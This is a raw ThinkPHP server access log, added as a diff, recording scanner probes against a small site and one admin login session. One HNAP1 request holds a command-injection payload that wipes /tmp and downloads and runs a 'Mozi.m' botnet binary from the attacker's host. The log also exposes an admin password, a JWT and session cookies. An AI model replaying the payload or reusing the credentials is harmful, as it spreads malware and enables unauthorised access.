@@ -1,0 +1,3900 @@
+---------------------------------------------------------------
+[ 2021-01-12T00:14:18+08:00 ] 189.39.248.68 GET 101.37.13.45:80/
+[运行时间：0.014930s] [吞吐率：66.98req/s] [内存消耗：1,758.86kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T01:14:43+08:00 ] 34.94.11.132 OPTIONS 101.37.13.45/
+[运行时间：0.015666s] [吞吐率：63.83req/s] [内存消耗：1,757.59kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T01:29:32+08:00 ] 61.131.202.180 GET 101.37.13.45:80/
+[运行时间：0.017420s] [吞吐率：57.41req/s] [内存消耗：1,758.74kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'connection' => 'Keep-Alive',
+  'user-agent' => 'Apache-HttpClient/4.5.6 (Java/1.8.0_112)',
+  'accept-encoding' => 'gzip,deflate',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T01:31:06+08:00 ] 61.131.203.79 GET 101.37.13.45/
+[运行时间：0.015264s] [吞吐率：65.51req/s] [内存消耗：1,760.12kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/85.0.4183.121 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'en-US',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T02:07:00+08:00 ] 52.152.168.103 GET 101.37.13.45/.env
+[运行时间：0.016141s] [吞吐率：61.95req/s] [内存消耗：1,832.53kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '.env',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T02:07:00+08:00 ] 52.152.168.103 GET 101.37.13.45/wp-content/
+[运行时间：0.016713s] [吞吐率：59.83req/s] [内存消耗：1,832.53kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'wp-content',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T02:09:27+08:00 ] 177.75.198.176 GET 101.37.13.45/phpmyadmin/
+[运行时间：0.019837s] [吞吐率：50.41req/s] [内存消耗：1,831.92kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'phpmyadmin',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
+  'host' => '101.37.13.45',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T02:27:08+08:00 ] 112.27.124.171 POST 101.37.13.45:80/HNAP1/
+[运行时间：0.015337s] [吞吐率：65.20req/s] [内存消耗：1,858.23kb] [文件加载：34]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'HNAP1',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'soapaction' => 'http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://112.27.124.171:58799/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi.m`',
+  'content-type' => 'text/xml; charset="utf-8"',
+  'content-length' => '640',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T02:46:16+08:00 ] 167.248.133.56 GET 101.37.13.45:80/
+[运行时间：0.015872s] [吞吐率：63.00req/s] [内存消耗：1,758.21kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T02:46:17+08:00 ] 167.248.133.56 GET 101.37.13.45/
+[运行时间：0.015951s] [吞吐率：62.69req/s] [内存消耗：1,758.61kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T02:57:17+08:00 ] 83.97.20.31 GET 101.37.13.45:80/
+[运行时间：0.015329s] [吞吐率：65.24req/s] [内存消耗：1,758.44kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T03:02:23+08:00 ] 117.252.71.117 GET 101.37.13.45:80/
+[运行时间：0.015980s] [吞吐率：62.58req/s] [内存消耗：1,758.87kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T03:20:10+08:00 ] 51.254.59.113 GET 101.37.13.45/
+[运行时间：0.016766s] [吞吐率：59.64req/s] [内存消耗：1,758.99kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T03:21:08+08:00 ] 209.141.60.195 GET 101.37.13.45:80/config/getuser?index=0
+[运行时间：0.017389s] [吞吐率：57.51req/s] [内存消耗：1,833.66kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'config',
+    1 => 'getuser',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'accept-language' => 'en-GB,en;q=0.5',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'upgrade-insecure-requests' => '1',
+)
+[ info ] [ PARAM ] array (
+  'index' => '0',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T03:36:01+08:00 ] 198.143.146.34 GET 101.37.13.45/
+[运行时间：0.016859s] [吞吐率：59.32req/s] [内存消耗：1,759.23kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T04:27:40+08:00 ] 51.255.3.107 GET 101.37.13.45/.env
+[运行时间：0.017025s] [吞吐率：58.74req/s] [内存消耗：1,832.48kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '.env',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T04:28:01+08:00 ] 51.255.3.107 POST 101.37.13.45/
+[运行时间：0.015504s] [吞吐率：64.50req/s] [内存消耗：1,758.98kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'content-length' => '20',
+)
+[ info ] [ PARAM ] array (
+  '0x' => 
+  array (
+    0 => 'androxgh0st',
+  ),
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T06:20:41+08:00 ] 103.21.1.165 GET 101.37.13.45:80/
+[运行时间：0.014745s] [吞吐率：67.82req/s] [内存消耗：1,758.87kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T06:41:28+08:00 ] 128.14.134.170 GET 101.37.13.45/
+[运行时间：0.016205s] [吞吐率：61.71req/s] [内存消耗：1,759.23kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T06:41:29+08:00 ] 128.14.134.170 GET 101.37.13.45/webfig/
+[运行时间：0.018462s] [吞吐率：54.17req/s] [内存消耗：1,832.25kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'webfig',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T12:07:36+08:00 ] 112.133.202.87 GET 101.37.13.45:80/
+[运行时间：0.014600s] [吞吐率：68.49req/s] [内存消耗：1,758.87kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T12:26:25+08:00 ] 209.141.60.195 GET 101.37.13.45:80/config/getuser?index=0
+[运行时间：0.018977s] [吞吐率：52.70req/s] [内存消耗：1,833.66kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'config',
+    1 => 'getuser',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'accept-language' => 'en-GB,en;q=0.5',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'upgrade-insecure-requests' => '1',
+)
+[ info ] [ PARAM ] array (
+  'index' => '0',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T12:59:47+08:00 ] 68.183.238.30 GET 101.37.13.45:80/
+[运行时间：0.016155s] [吞吐率：61.90req/s] [内存消耗：1,758.44kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T13:33:22+08:00 ] 172.19.6.249 GET 101.37.13.45:80/
+[运行时间：0.017071s] [吞吐率：58.58req/s] [内存消耗：1,759.45kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
+  'x-proxy-id' => '108354719',
+  'x-forwarded-for' => '172.19.6.249',
+  'via' => '1.1 172.19.6.1 (Mikrotik HttpProxy)',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T14:03:49+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/admin/login/dologin
+[运行时间：0.040221s] [吞吐率：24.86req/s] [内存消耗：3,421.42kb] [文件加载：51]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-cn',
+  'origin' => 'http://101.37.13.45',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'referer' => 'http://101.37.13.45/index.php/admin/login/index.html',
+  'cookie' => 'Path=/www/wwwroot/101.37.13.45; SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'content-length' => '30',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'admin',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\admin\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/admin/controller/Login.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ VIEW ] /www/wwwroot/101.37.13.45/thinkphp/tpl/dispatch_jump.tpl [ array (
+  0 => 'code',
+  1 => 'msg',
+  2 => 'data',
+  3 => 'url',
+  4 => 'wait',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000544s ] mysql:host=127.0.0.1;dbname=miaosha;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `user` [ RunTime:0.001266s ]
+[ sql ] [ SQL ] SELECT `user_id`,`username`,`password` FROM `user` WHERE  `username` = 'admin' LIMIT 1 [ RunTime:0.000393s ]
+[ sql ] [ SQL ] UPDATE `user`  SET `token`='eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJpc3MiOiJ5dXl1IiwiYXVkIjoieXV5dSIsImlhdCI6MTYxMDQzMTQyOSwibmJmIjoxNjEwNDMxNDI5LCJleHAiOjE2MTA0MzI2Mjl9.NCZon5hGTVP2fFgdBSx9f519XdjSwRnOp1cxpPCg0MU'  WHERE  `username` = 'admin' [ RunTime:0.004796s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `role_user` [ RunTime:0.000585s ]
+[ sql ] [ SQL ] SELECT `role_id` FROM `role_user` WHERE  `user_id` = 1 LIMIT 1 [ RunTime:0.000258s ]
+---------------------------------------------------------------
+[ 2021-01-12T14:03:51+08:00 ] 115.27.214.243 GET 101.37.13.45/index.php/admin/main/index.html
+[运行时间：0.037759s] [吞吐率：26.48req/s] [内存消耗：3,388.80kb] [文件加载：50]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'main',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'cookie' => 'PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJpc3MiOiJ5dXl1IiwiYXVkIjoieXV5dSIsImlhdCI6MTYxMDQzMTQyOSwibmJmIjoxNjEwNDMxNDI5LCJleHAiOjE2MTA0MzI2Mjl9.NCZon5hGTVP2fFgdBSx9f519XdjSwRnOp1cxpPCg0MU; username=admin; Path=/www/wwwroot/101.37.13.45; SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/admin/login/dologin',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip, deflate',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\admin\controller\Main->index[ /www/wwwroot/101.37.13.45/application/admin/controller/Main.php ]
+[ info ] [ VIEW ] /www/wwwroot/101.37.13.45/public/../application/admin/view/main/index.html [ array (
+  0 => 'username',
+  1 => 'menu',
+  2 => 'lists',
+  3 => 'user',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000365s ] mysql:host=127.0.0.1;dbname=miaosha;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `user` [ RunTime:0.000721s ]
+[ sql ] [ SQL ] SELECT `user_id`,`username`,`token` FROM `user` WHERE  `username` = 'admin' LIMIT 1 [ RunTime:0.000360s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `role_user` [ RunTime:0.000485s ]
+[ sql ] [ SQL ] SELECT `role_id` FROM `role_user` WHERE  `user_id` = 1 LIMIT 1 [ RunTime:0.000192s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `access` [ RunTime:0.000474s ]
+[ sql ] [ SQL ] SELECT * FROM `access` `a` INNER JOIN `node` `n` ON `a`.`node_id`=`n`.`node_id` WHERE  `role_id` = 1 [ RunTime:0.000336s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `admin_log` [ RunTime:0.000488s ]
+[ sql ] [ SQL ] INSERT INTO `admin_log` (`querystring` , `m` , `c` , `a` , `user_id` , `username` , `ip` , `time`) VALUES ('' , 'admin' , 'Main' , 'index' , 1 , 'admin' , '1931204339' , '1610431431') [ RunTime:0.004800s ]
+[ sql ] [ SQL ] SELECT * FROM `user` [ RunTime:0.000262s ]
+---------------------------------------------------------------
